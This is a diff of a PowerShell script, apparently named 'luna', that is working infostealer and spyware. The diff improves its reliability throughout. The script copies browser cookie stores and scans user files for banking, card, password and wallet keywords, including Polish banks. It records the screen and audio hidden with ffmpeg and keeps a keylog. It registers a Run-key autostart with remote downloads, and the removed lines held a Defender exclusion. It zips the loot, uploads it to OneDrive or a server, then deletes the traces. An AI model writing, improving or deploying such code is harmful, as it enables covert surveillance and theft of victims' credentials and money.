@@ -14,6 +14,7 @@ New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir, $r
 
 Start-Transcript -Path "$tempDir\session.log" -Append
 
+
 function Collect-Cookies {
     $targets = @(
         "$env:LOCALAPPDATA\Google\Chrome\User Data",
@@ -29,7 +30,7 @@ function Collect-Cookies {
             Where-Object { $_.Length -gt 0 } |
             ForEach-Object {
                 try {
-                    $safeName = $_.FullName -replace '[^\w\d\-_\.]', '_'
+                    $safeName = [IO.Path]::GetFileName($_.FullName) -replace '[^\w\d\-_\.]', '_'
                     Copy-Item $_.FullName "$cookieDir\$safeName" -Force -ErrorAction Stop
                 } catch {}
             }
@@ -43,24 +44,27 @@ function Collect-Files {
     $keywords = @("haslo", "login", "password", "secret", "bank", "karta", "card", "visa", "dane", "konto", "portfel", "millenium", "pko", "pekao", "sber", "wallet")
     $maxSize = 5MB
 
+
     foreach ($dir in $targets) {
         foreach ($ext in $extensions) {
             Get-ChildItem -Path $dir -Recurse -Include $ext -File -ErrorAction SilentlyContinue | ForEach-Object {
                 $file = $_
                 if ($file.Length -le $maxSize -and $file.Name) {
-                    foreach ($kw in $keywords) {
-                        if ($file.Name.ToLowerInvariant().Contains($kw.ToLowerInvariant())) {
-                            try {
+                    try {
+                        $content = Get-Content $file.FullName -ErrorAction SilentlyContinue -Raw -Encoding UTF8
+                        foreach ($kw in $keywords) {
+                            if ($content -match $kw) {
                                 $safeName = $file.Name -replace '[^\w\d\-_\.]', '_'
                                 Copy-Item $file.FullName "$fileDumpDir\$safeName" -Force -ErrorAction Stop
-                            } catch {}
-                            break
+                                break
+                            }
                         }
-                    }
+                    } catch {}
                 }
             }
         }
     }
+
 }
 
 
@@ -70,31 +74,86 @@ function Start-Recording {
     $recordingDir = "$env:USERPROFILE\luna_video_fragments"
 
     if (!(Test-Path $ffmpeg)) {
-        Write-Warning "ffmpeg not found at $ffmpeg"
-        return
+        Write-Warning "ffmpeg not found: $ffmpeg"
+        return $null
     }
 
     if (!(Test-Path $recordingDir)) {
         New-Item -ItemType Directory -Path $recordingDir -Force | Out-Null
     }
 
-    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
-    $pattern = "$recordingDir\frag_$ts_%03d.mp4"
+    $file = "$recordingDir\frag_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp4"
+    $args = @(
+        "-f", "gdigrab", "-framerate", "15", "-i", "desktop",
+        "-f", "dshow", "-i", "audio=CABLE Output (VB-Audio Virtual Cable)",
+        "-vcodec", "libx264", "-preset", "veryfast",
+        "-acodec", "aac", "-ar", "44100", "-b:a", "128k",
+        "-t", "60",
+        "-y", "$file"
+    )
+
+    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $startInfo.FileName = $ffmpeg
+    $startInfo.Arguments = $args -join " "
+    $startInfo.RedirectStandardOutput = $true
+    $startInfo.RedirectStandardError = $true
+    $startInfo.UseShellExecute = $false
+    $startInfo.CreateNoWindow = $true
+
+    $process = New-Object System.Diagnostics.Process
+    $process.StartInfo = $startInfo
+
+    Write-Output "Launching ffmpeg..."
 
     try {
-        Start-Process -FilePath $ffmpeg -ArgumentList @(
-            "-f", "gdigrab", "-framerate", "15", "-i", "desktop",
-            "-f", "dshow", "-i", "audio=virtual-audio-capturer",
-            "-vcodec", "libx264", "-preset", "veryfast",
-            "-acodec", "aac", "-ar", "44100", "-b:a", "128k",
-            "-f", "segment", "-segment_time", "60",
-            "-reset_timestamps", "1", "$pattern"
-        ) -WindowStyle Hidden -PassThru | Out-Null
-        Write-Output "Recording started"
+        $process.Start() | Out-Null
+        $global:ffmpegProcess = $process
+        Write-Output "ffmpeg started with PID: $($process.Id)"
+
+        $stdErr = $process.StandardError.ReadToEnd()
+
+        $process.WaitForExit()
+
+        if (Test-Path $file) {
+            Write-Output "Recording completed: $file"
+        } else {
+            Write-Warning "Recording failed - file not created"
+            Add-Content -Path "$tempDir\ffmpeg_error.log" -Value $stdErr
+            Write-Warning "Error log written to ffmpeg_error.log"
+        }
+
+        return $file
     } catch {
-        Write-Warning "Failed to start ffmpeg recording: $_"
+        Write-Warning "Start-Recording error: $_"
+        return $null
     }
 }
+
+function Stop-Recording {
+    try {
+        Get-Process -Name "ffmpeg" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Start-Sleep -Seconds 3 
+        Write-Output "Recording stopped"
+    } catch {
+        Write-Warning "Failed to stop recording: $_"
+    }
+}
+
+function Wait-Recording {
+    try {
+        if ($global:ffmpegProcess -and !$global:ffmpegProcess.HasExited) {
+            Write-Output "Waiting for ffmpeg (PID $($global:ffmpegProcess.Id)) to finish..."
+            $global:ffmpegProcess.WaitForExit()
+            Write-Output "Recording finished."
+        } else {
+            Write-Warning "ffmpeg process is not active."
+        }
+    } catch {
+        Write-Warning "Wait-Recording exception: $_"
+    }
+}
+
+
 
 
 "" | Out-File -Encoding utf8 -Force $keylogPath
@@ -128,12 +187,19 @@ function Ensure-Autostart {
         foreach ($f in $files) {
             Invoke-WebRequest "$repo/$f" -OutFile "$path\$f" -UseBasicParsing
         }
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value "$path\luna_launcher.bat"
-        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
+
+        $batPath = "$path\luna_launcher.bat"
+        if (Test-Path $batPath) {
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value $batPath -ErrorAction Stop
+            Write-Output "Autostart registered: $batPath"
+        } else {
+            Write-Warning "Launcher not found for autostart: $batPath"
+        }
+
     }
 }
-
 function Archive-And-Report {
+    $global:archiveSuccess = $false
     $videoSubDir = "$tempDir\video"
     New-Item -ItemType Directory -Path $videoSubDir -Force -ErrorAction SilentlyContinue | Out-Null
 
@@ -155,17 +221,43 @@ function Archive-And-Report {
         }
 
         $pathsToArchive = @()
-        if (Test-Path $cookieDir)     { $pathsToArchive += Get-ChildItem $cookieDir     -Recurse -File -ErrorAction SilentlyContinue }
-        if (Test-Path $fileDumpDir)   { $pathsToArchive += Get-ChildItem $fileDumpDir   -Recurse -File -ErrorAction SilentlyContinue }
-        if (Test-Path $videoSubDir)   { $pathsToArchive += Get-ChildItem $videoSubDir   -Recurse -File -ErrorAction SilentlyContinue }
-        $pathsToArchive += $logPath, $meta, $keylogPath
+
+        if (Test-Path $cookieDir) {
+            $pathsToArchive += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
+        }
+
+        if (Test-Path $fileDumpDir) {
+            $pathsToArchive += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
+        }
+
+        if (Test-Path $videoSubDir) {
+            $pathsToArchive += Get-ChildItem $videoSubDir -Recurse -File -ErrorAction SilentlyContinue
+        }
+
+        foreach ($staticFile in @($logPath, $meta, $keylogPath)) {
+            if (Test-Path $staticFile) {
+                $pathsToArchive += Get-Item $staticFile
+            }
+        }
+
+        $pathsToArchive = $pathsToArchive | Where-Object {
+            $_ -and (Test-Path $_.FullName) -and !(Test-Path $_.FullName -PathType Container)
+        } | Select-Object -ExpandProperty FullName -Unique
+
+        Start-Sleep -Seconds 2
+
 
         if ($pathsToArchive.Count -eq 0) {
             Write-Warning "Nothing to archive - skipping archive/report"
             return
         }
 
+        Write-Output "Collected files:"
+        $pathsToArchive | ForEach-Object { Write-Output "t$_" }
+
         Compress-Archive -Path $pathsToArchive -DestinationPath $zipPath -Force
+        Write-Output "Archive created: $zipPath"
+
         & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
 
         if ($LASTEXITCODE -ne 0) {
@@ -175,14 +267,17 @@ function Archive-And-Report {
             Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
         }
 
+        $filesList = if (Test-Path $fileDumpDir) { Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue } else { @() }
+        $cookiesList = if (Test-Path $cookieDir) { Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue } else { @() }
+
         if (Test-Path $fileDumpDir) {
-            $filesCount = (Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count
+            $filesCount = $filesList.Count
         } else {
             $filesCount = 0
         }
 
         if (Test-Path $cookieDir) {
-            $cookiesCount = (Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count
+            $cookiesCount = $cookiesList.Count
         } else {
             $cookiesCount = 0
         }
@@ -206,7 +301,6 @@ Cookies: $cookiesCount
 }
 
 
-
 function Cleanup {
     try {
         Remove-Item "$tempDir\*" -Recurse -Force -ErrorAction SilentlyContinue
@@ -220,16 +314,18 @@ while ($true) {
     Collect-Cookies
     Collect-Files
     Start-Recording
-    Start-Sleep -Seconds 90
     Ensure-Autostart
+    Write-Output "Waiting for recording to finish..."
+    Wait-Recording
+    Write-Output "Recording done, proceeding to archive"
     Archive-And-Report
-
-    if (Test-Path $zipPath) {
-        Start-Sleep -Seconds 30
+    if ($global:archiveSuccess) {
         Cleanup
     }
-
-    Start-Sleep -Seconds 60
+    Start-Sleep -Seconds 10
 }
+
+
+
 
 Stop-Transcript
